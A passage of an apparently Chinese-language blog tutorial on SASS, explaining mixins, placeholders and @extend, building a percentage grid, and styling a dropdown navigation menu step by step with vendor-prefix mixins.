class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">%grid &#123;</span><br><span class=\"line\">  <span class=\"attribute\">box-sizing</span>: border-box;</span><br><span class=\"line\">  <span class=\"attribute\">display</span>: inline-block;</span><br><span class=\"line\">  <span class=\"attribute\">padding-left</span>: <span class=\"number\">1em</span>;</span><br><span class=\"line\">  <span class=\"attribute\">padding-right</span>: <span class=\"number\">1em</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">@<span class=\"keyword\">mixin</span> grid(<span class=\"variable\">$width</span>: 1)&#123;</span><br><span class=\"line\">  @<span class=\"keyword\">extend</span> %grid;</span><br><span class=\"line\">  <span class=\"attribute\">width</span>: percentage(<span class=\"variable\">$width</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-class\">.grid-half</span> &#123;</span><br><span class=\"line\">  @<span class=\"keyword\">include</span> grid(<span class=\"number\">1</span> / 2);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-class\">.grid-third</span> &#123;</span><br><span class=\"line\">  @<span class=\"keyword\">include</span> grid(<span class=\"number\">1</span> / 3);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>按照这样的方法，我们可以制作出一个简单的百分比网格系统：</p>\n<figure class=\"highlight scss\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"variable\">$columns</span>: <span class=\"number\">12</span>;</span><br><span class=\"line\"><span class=\"variable\">$gutter</span>: <span class=\"number\">2em</span>;</span><br><span class=\"line\"></span><br><span class=\"line\">%grid &#123;</span><br><span class=\"line\">  <span class=\"attribute\">box-sizing</span>: border-box;</span><br><span class=\"line\">  <span class=\"attribute\">display</span>: inline-block;</span><br><span class=\"line\">  <span class=\"attribute\">padding</span>: &#123;</span><br><span class=\"line\">    left:<span class=\"variable\">$gutter</span> / <span class=\"number\">2</span>;</span><br><span class=\"line\">    <span class=\"attribute\">right</span>:<span class=\"variable\">$gutter</span> / <span class=\"number\">2</span>;</span><br><span class=\"line\">  &#125;   </span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">@<span class=\"keyword\">mixin</span> grid(<span class=\"variable\">$width</span>: 1)&#123;</span><br><span class=\"line\">  @<span class=\"keyword\">extend</span> %grid;</span><br><span class=\"line\">  <span class=\"attribute\">width</span>: percentage(<span class=\"variable\">$width</span>);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">@<span class=\"keyword\">for</span> <span class=\"variable\">$column</span> from 1 through <span class=\"variable\">$columns</span> &#123;</span><br><span class=\"line\">  <span class=\"selector-class\">.grid-</span>#&#123;<span class=\"variable\">$column</span>&#125; &#123;</span><br><span class=\"line\">    @<span class=\"keyword\">include</span> grid(<span class=\"number\">1</span> / <span class=\"variable\">$column</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<h2 id=\"使用Mixins和继承的细节\"><a href=\"#使用Mixins和继承的细节\" class=\"headerlink\" title=\"使用Mixins和继承的细节\"></a>使用Mixins和继承的细节</h2><p>了解了<code>@include</code>定义的<code>@mixin</code>,<code>@extend</code>定义的<code>.class</code>和<code>@extend</code>定义的<code>%placeholders</code>差异之后，我们在写SASS时，有一些细节大家应该了解：</p>\n<ul>\n<li>不要使用没有设置参数的<code>@mixin</code>，他们应该是<code>.class</code>或者<code>%placeholders</code>;</li>\n<li>不要轻意（从不使用）<code>@extend</code>调用<code>.class</code>。会得到你意想不到的结果，特别是定义的<code>.class</code>出现在嵌套或其他的样式表中，你应该使用<code>@extend</code>调用<code>%placeholders</code>;</li>\n<li>不要使用太深的选择器嵌套。</li>\n<li>如果你能避免，不要使用标签名。这不是一个taxative规则，但比id或者类名的性能要更低；</li>\n<li>不要使用子选择器符号<code>&gt;</code>，在SASS中很无效；</li>\n<li>不要使用同史选择器<code>+</code>，配合你当前的标记他是非常无效。</li>\n<li>不要太相信SASS的自动编译，你应该时时检查生成的CSS。在SASS中纠错能力比较差；</li>\n</ul>\n<h2 id=\"案例实战\"><a href=\"#案例实战\" class=\"headerlink\" title=\"案例实战\"></a>案例实战</h2><p><img src=\"/view/posts/ea50967e/%E6%A1%88%E4%BE%8B%E5%AE%9E%E6%88%98.gif\" alt=\"案例实战\"></p>\n<p>1.<code>html</code>结构</p>\n<figure class=\"highlight html\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"tag\">&lt;<span class=\"name\">ul</span> <span class=\"attr\">class</span>=<span class=\"string\">\"menu\"</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">li</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>=<span class=\"string\">\"\"</span>&gt;</span>首页<span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">li</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">li</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>=<span class=\"string\">\"\"</span>&gt;</span>博客<span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;<span class=\"name\">ul</span> <span class=\"attr\">class</span>=<span class=\"string\">\"drop-menu\"</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">li</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>=<span class=\"string\">\"\"</span>&gt;</span>CSS3<span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">li</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">li</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>=<span class=\"string\">\"\"</span>&gt;</span>SASS<span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">li</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">li</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>=<span class=\"string\">\"\"</span>&gt;</span>JavaScript<span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">li</span>&gt;</span></span><br><span class=\"line\">      <span class=\"tag\">&lt;<span class=\"name\">li</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>=<span class=\"string\">\"\"</span>&gt;</span>jQuery<span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">li</span>&gt;</span></span><br><span class=\"line\">    <span class=\"tag\">&lt;/<span class=\"name\">ul</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;/<span class=\"name\">li</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">li</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>=<span class=\"string\">\"\"</span>&gt;</span>案例<span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">li</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">li</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>=<span class=\"string\">\"\"</span>&gt;</span>资源<span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">li</span>&gt;</span></span><br><span class=\"line\">  <span class=\"tag\">&lt;<span class=\"name\">li</span>&gt;</span><span class=\"tag\">&lt;<span class=\"name\">a</span> <span class=\"attr\">href</span>=<span class=\"string\">\"\"</span>&gt;</span>前端收藏夹<span class=\"tag\">&lt;/<span class=\"name\">a</span>&gt;</span><span class=\"tag\">&lt;/<span class=\"name\">li</span>&gt;</span></span><br><span class=\"line\"><span class=\"tag\">&lt;/<span class=\"name\">ul</span>&gt;</span></span><br></pre></td></tr></table></figure>\n<p>有了结构，我们就要开始动手了，在动手之前对这个效果先简单的分析一下：</p>\n<ul>\n<li><strong>定义变量</strong>：我要定义几个变量，方便换成别的风格；</li>\n<li><strong>清除浮动</strong>：列表使用了浮动，需要清除浮动</li>\n<li><strong>清除列表默认样式</strong>：导航是使用ul制作，所以需要清除其默认样式</li>\n<li><strong>定义transfrom</strong>：效果中使用到了CSS3的transform，使用<code>@mixin</code>定义成一个模块</li>\n<li><strong>定义transition</strong>：下拉菜单出现的时候有一个transition效果</li>\n<li><strong>定义fit-content</strong>：使用CSS3的fit-content</li>\n<li><strong>定义box-shadow</strong>：使用CSS3的box-shadow</li>\n<li><strong>定义文本</strong>：设置菜单项文本效果</li>\n</ul>\n<ol>\n<li>定义变量</li>\n</ol>\n<figure class=\"highlight scss\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//1.定义变量</span></span><br><span class=\"line\"><span class=\"variable\">$color</span>: <span class=\"number\">#fff</span> !default; <span class=\"comment\">//设置文本颜色</span></span><br><span class=\"line\"><span class=\"variable\">$bgColor</span>: <span class=\"number\">#34495e</span> !default;<span class=\"comment\">//设置背景色</span></span><br><span class=\"line\"><span class=\"variable\">$sfbgColor</span>: <span class=\"number\">#e74c3c</span> !default;<span class=\"comment\">//设置悬浮背景色</span></span><br><span class=\"line\"><span class=\"variable\">$fontSize</span>: <span class=\"number\">14px</span> !default;<span class=\"comment\">//设置字号</span></span><br><span class=\"line\"><span class=\"variable\">$fontFamily</span>: Arial, Helvetica !default;<span class=\"comment\">//设置字体</span></span><br><span class=\"line\"><span class=\"variable\">$width</span>: <span class=\"number\">462px</span> !default; <span class=\"comment\">//设置默认宽度</span></span><br></pre></td></tr></table></figure>\n<ol start=\"2\">\n<li>清除浮动</li>\n</ol>\n<figure class=\"highlight scss\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//2.使用%placeholders定义清除浮动</span></span><br><span class=\"line\">%clearfix &#123;</span><br><span class=\"line\">  &amp;&#123;</span><br><span class=\"line\">    *zoom: <span class=\"number\">1</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  &amp;:before,</span><br><span class=\"line\">  &amp;:after&#123;</span><br><span class=\"line\">    <span class=\"attribute\">content</span>: <span class=\"string\">\"\"</span>;</span><br><span class=\"line\">    <span class=\"attribute\">display</span>: table;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  &amp;:after &#123;</span><br><span class=\"line\">    <span class=\"attribute\">clear</span>: both;</span><br><span class=\"line\">    <span class=\"attribute\">overflow</span>: hidden;</span><br><span class=\"line\">  &#125;</span><br></pre></td></tr></table></figure>\n<ol start=\"3\">\n<li>清除列表默认样式</li>\n</ol>\n<figure class=\"highlight scss\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//3.清除列表默认样式</span></span><br><span class=\"line\">%listStyle &#123;</span><br><span class=\"line\">  <span class=\"attribute\">margin</span>: <span class=\"number\">0</span>;</span><br><span class=\"line\">  <span class=\"attribute\">padding</span>: <span class=\"number\">0</span>;    <span class=\"attribute\">list-style</span>: none outside none;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"variable\">$prefix-for-webkit</span>: true !default;</span><br><span class=\"line\"><span class=\"variable\">$prefix-for-mozilla</span>: true !default;</span><br><span class=\"line\"><span class=\"variable\">$prefix-for-microsoft</span>: true !default;</span><br><span class=\"line\"><span class=\"variable\">$prefix-for-opera</span>: true !default;</span><br><span class=\"line\"><span class=\"variable\">$prefix-for-spec</span>: true !default;</span><br></pre></td></tr></table></figure>\n<ol start=\"4\">\n<li>定义transfrom</li>\n</ol>\n<figure class=\"highlight scss\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 4.浏览器前缀</span></span><br><span class=\"line\">@<span class=\"keyword\">mixin</span> prefixer (<span class=\"variable\">$property</span>, <span class=\"variable\">$value</span>, <span class=\"variable\">$prefixes</span>) &#123;</span><br><span class=\"line\">  @<span class=\"keyword\">each</span> <span class=\"variable\">$prefix</span> in <span class=\"variable\">$prefixes</span> &#123;</span><br><span class=\"line\">    @<span class=\"keyword\">if</span> <span class=\"variable\">$prefix</span> == webkit and <span class=\"variable\">$prefix-for-webkit</span> == true &#123;</span><br><span class=\"line\">      -webkit-#&#123;<span class=\"variable\">$property</span>&#125;: <span class=\"variable\">$value</span>;</span><br><span class=\"line\">    &#125; @<span class=\"keyword\">else</span> if <span class=\"variable\">$prefix</span> == moz and <span class=\"variable\">$prefix-for-mozilla</span> == true &#123;</span><br><span class=\"line\">      -moz-#&#123;<span class=\"variable\">$property</span>&#125;: <span class=\"variable\">$value</span>;</span><br><span class=\"line\">    &#125; @<span class=\"keyword\">else</span> if <span class=\"variable\">$prefix</span> == ms and <span class=\"variable\">$prefix-for-microsoft</span> == true &#123;</span><br><span class=\"line\">      -ms-#&#123;<span class=\"variable\">$property</span>&#125;: <span class=\"variable\">$value</span>;</span><br><span class=\"line\">    &#125; @<span class=\"keyword\">else</span> if <span class=\"variable\">$prefix</span> == o and <span class=\"variable\">$prefix-for-opera</span> == true &#123;</span><br><span class=\"line\">      -o-#&#123;<span class=\"variable\">$property</span>&#125;: <span class=\"variable\">$value</span>;</span><br><span class=\"line\">    &#125; @<span class=\"keyword\">else</span> if <span class=\"variable\">$prefix</span> == spec and <span class=\"variable\">$prefix-for-spec</span> == true &#123;</span><br><span class=\"line\">      #&#123;<span class=\"variable\">$property</span>&#125;: <span class=\"variable\">$value</span>;</span><br><span class=\"line\">    &#125; @<span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">      @<span class=\"keyword\">warn</span> <span class=\"string\">\"Unrecognized prefix: #&#123;$prefix&#125;\"</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<ol start=\"5\">\n<li>定义transition</li>\n</ol>\n<figure class=\"highlight scss\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//5.定义transform</span></span><br><span class=\"line\"><span class=\"comment\">//示例: @include prefixer(border-radius, $radius, webkit spec);</span></span><br><span class=\"line\"><span class=\"comment\">//Transform, transform-origin, transform-style</span></span><br><span class=\"line\"><span class=\"comment\">//----------------------------------------</span></span><br><span class=\"line\">@<span class=\"keyword\">mixin</span> transform(<span class=\"variable\">$property</span>...) &#123;</span><br><span class=\"line\">  @<span class=\"keyword\">include</span> prefixer(transform, <span class=\"variable\">$property</span>, webkit moz o ms spec);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">@<span class=\"keyword\">mixin</span> transform-origin(<span class=\"variable\">$axes</span>: 50%) &#123;</span><br><span class=\"line\">  <span class=\"comment\">// x-axis - left | center | right  | length | %</span></span><br><span class=\"line\">  <span class=\"comment\">// y-axis - top  | center | bottom | length | %</span></span><br><span class=\"line\">  <span class=\"comment\">// z-axis - length</span></span><br><span class=\"line\">  @<span class=\"keyword\">include</span> prefixer(transform-origin, <span class=\"variable\">$axes</span>, webkit moz o ms spec);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">@<span class=\"keyword\">mixin</span> skewX(<span class=\"variable\">$degrees</span>) &#123;</span><br><span class=\"line\">  @<span class=\"keyword\">include</span> prefixer(transform, skewX(<span class=\"variable\">$degrees</span>), webkit moz o ms spec);</span><br><span class=\"line\">  -webkit-<span class=\"attribute\">backface-visibility</span>: hidden;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<ol start=\"6\">\n<li>定义fit-content</li>\n</ol>\n<figure class=\"highlight scss\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//6.定义transition</span></span><br><span class=\"line\"><span class=\"comment\">// Return vendor-prefixed property names if appropriate</span></span><br><span class=\"line\"><span class=\"comment\">// Example: transition-property-names((transform, color, background), moz) -&gt; -moz-transform, color, background//----------------------------------------</span></span><br><span class=\"line\">@function transition-property-names(<span class=\"variable\">$props</span>, <span class=\"variable\">$vendor</span>: false) &#123;</span><br><span class=\"line\">  <span class=\"variable\">$new-props</span>: ();</span><br><span class=\"line\">  @<span class=\"keyword\">each</span> <span class=\"variable\">$prop</span> in <span class=\"variable\">$props</span> &#123;</span><br><span class=\"line\">    <span class=\"variable\">$new-props</span>: append(<span class=\"variable\">$new-props</span>, transition-property-name(<span class=\"variable\">$prop</span>, <span class=\"variable\">$vendor</span>), comma);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  @return <span class=\"variable\">$new-props</span>;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\">@function transition-property-name(<span class=\"variable\">$prop</span>, <span class=\"variable\">$vendor</span>: false) &#123;</span><br><span class=\"line\">  <span class=\"comment\">// put other properties that need to be prefixed here aswell</span></span><br><span class=\"line\">  @<span class=\"keyword\">if</span> <span class=\"variable\">$vendor</span> and <span class=\"variable\">$prop</span> == transform &#123;</span><br><span class=\"line\">    @return unquote(<span class=\"string\">'-'</span>+<span class=\"variable\">$vendor</span>+<span class=\"string\">'-'</span>+<span class=\"variable\">$prop</span>);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">  @<span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    @return <span class=\"variable\">$prop</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"><span class=\"comment\">// transition</span></span><br><span class=\"line\"><span class=\"comment\">//----------------------------------------</span></span><br><span class=\"line\">@<span class=\"keyword\">mixin</span> transition (<span class=\"variable\">$properties</span>...) &#123;</span><br><span class=\"line\">  @<span class=\"keyword\">if</span> length(<span class=\"variable\">$properties</span>) &gt;= 1 &#123;</span><br><span class=\"line\">    @<span class=\"keyword\">include</span> prefixer(transition, <span class=\"variable\">$properties</span>, webkit moz o ms spec);</span><br><span class=\"line\">  &#125; @<span class=\"keyword\">else</span> &#123;</span><br><span class=\"line\">    <span class=\"variable\">$properties</span>: all <span class=\"number\">0.15s</span> ease-out <span class=\"number\">0</span>;</span><br><span class=\"line\">    @<span class=\"keyword\">include</span> prefixer(transition, <span class=\"variable\">$properties</span>, webkit moz o ms spec);</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<ol start=\"7\">\n<li>定义fit-content</li>\n</ol>\n<figure class=\"highlight scss\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//7.定义fit-content</span></span><br><span class=\"line\">@<span class=\"keyword\">mixin</span> fit-content &#123;</span><br><span class=\"line\">  <span class=\"attribute\">width</span>: -webkit-fit-content;</span><br><span class=\"line\">  <span class=\"attribute\">width</span>: -moz-fit-content;</span><br><span class=\"line\">  <span class=\"attribute\">width</span>: -o-fit-content;</span><br><span class=\"line\">  <span class=\"attribute\">width</span>: -ms-fit-content;</span><br><span class=\"line\">  <span class=\"attribute\">width</span>: fit-content;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<ol start=\"8\">\n<li>定义box-shadow</li>\n</ol>\n<figure class=\"highlight scss\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//8.设置box-shadow</span></span><br><span class=\"line\"><span class=\"comment\">// box-shadow</span></span><br><span class=\"line\">@<span class=\"keyword\">mixin</span> box-shadow(<span class=\"variable\">$shadow</span>...) &#123;</span><br><span class=\"line\">  @<span class=\"keyword\">include</span> prefixer(box-shadow, <span class=\"variable\">$shadow</span>, webkit spec);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<ol start=\"9\">\n<li>定义文本</li>\n</ol>\n<figure class=\"highlight scss\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">//9.设置文本</span></span><br><span class=\"line\">%typography &#123;</span><br><span class=\"line\">  <span class=\"attribute\">color</span>: <span class=\"variable\">$color</span>;</span><br><span class=\"line\">  text: &#123;</span><br><span class=\"line\">    decoration: none;</span><br><span class=\"line\">    align: center;</span><br><span class=\"line\">  &#125;   </span><br><span class=\"line\">  <span class=\"attribute\">font</span>: &#123;</span><br><span class=\"line\">    family: <span class=\"variable\">$fontFamily</span>;</span><br><span class=\"line\">    size: <span class=\"variable\">$fontSize</span>;</span><br><span class=\"line\">  &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<ol start=\"10\">\n<li>具体样式</li>\n</ol>\n<figure class=\"highlight scss\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\">// 10.具体样式</span></span><br><span class=\"line\"><span class=\"selector-class\">.menu</span> &#123;</span><br><span class=\"line\">  <span class=\"attribute\">width</span>: <span class=\"variable\">$width</span>;</span><br><span class=\"line\">  @<span class=\"keyword\">extend</span> %clearfix;<span class=\"comment\">//调用清除浮动</span></span><br><span class=\"line\">  @<span class=\"keyword\">extend</span> %listStyle;<span class=\"comment\">//调用清除列表样式</span></span><br><span class=\"line\">  @<span class=\"keyword\">include</span> fit-content;</span><br><span class=\"line\">  <span class=\"attribute\">margin</span>: <span class=\"number\">50px</span> auto;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"selector-class\">.drop-menu</span> &#123;</span><br><span 